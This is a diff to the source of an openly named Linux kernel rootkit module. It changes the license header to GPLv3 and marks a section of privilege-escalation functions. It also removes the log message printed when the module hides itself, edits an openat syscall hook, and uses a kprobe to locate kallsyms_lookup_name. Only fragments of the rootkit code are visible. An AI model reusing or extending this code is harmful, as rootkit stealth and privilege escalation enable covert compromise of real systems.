@@ -1,25 +1,20 @@
 /*
- * MIT License
+ * pwn: A linux kernel module rootkit
  *
- * Copyright (c) 2025 Joshua Poole
+ * Copyright (c) 2025 Joshua Poole <joshpoole6@gmail.com>
  *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
  *
- * The above copyright notice and this permission notice shall be included in all
- * copies or substantial portions of the Software.
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
  *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
- * SOFTWARE.
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 
 #include <linux/init.h>
@@ -165,7 +160,7 @@ static struct data_node *find_data_node_field(struct data_node **head, void *nee
 
 //***************************************** Functions for privilege escalation *****************************************
 // A lot of these functions were adapted from https://github.com/croemheld/lkm-rootkit/tree/master
-struct task_struct *real_init;
+struct task_struct *real_init = NULL;
 struct data_node *creds = NULL;
 struct cred_node {
 	int pid;
@@ -614,7 +609,6 @@ static int is_hidden = 0;
 static void hide_module(void) {
     if (is_hidden) return;
 
-    printk(KERN_INFO "rootkit: hiding module\n");
     prev_module = THIS_MODULE->list.prev;
 
     list_del(&THIS_MODULE->list);
@@ -716,7 +710,7 @@ static asmlinkage long hook_openat(const struct pt_regs *regs) {
     const char __user *filename = (const char __user *)regs->si;
 
     char kernel_filename[256];
-    long copied = strncpy_from_user(kernel_filename, filename, 255);
+    int copied = strncpy_from_user(kernel_filename, filename, 255);
 
     if (copied > 0) {
         kernel_filename[255] = '\0';
@@ -734,9 +728,7 @@ static asmlinkage long hook_openat(const struct pt_regs *regs) {
 
 //************************************************** initialise module *************************************************
 static int __init rootkit_init(void) {
-    int err;
-
-    err = register_kprobe(&kp);
+    int err = register_kprobe(&kp);
     if (err < 0) return err;
 
     kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;
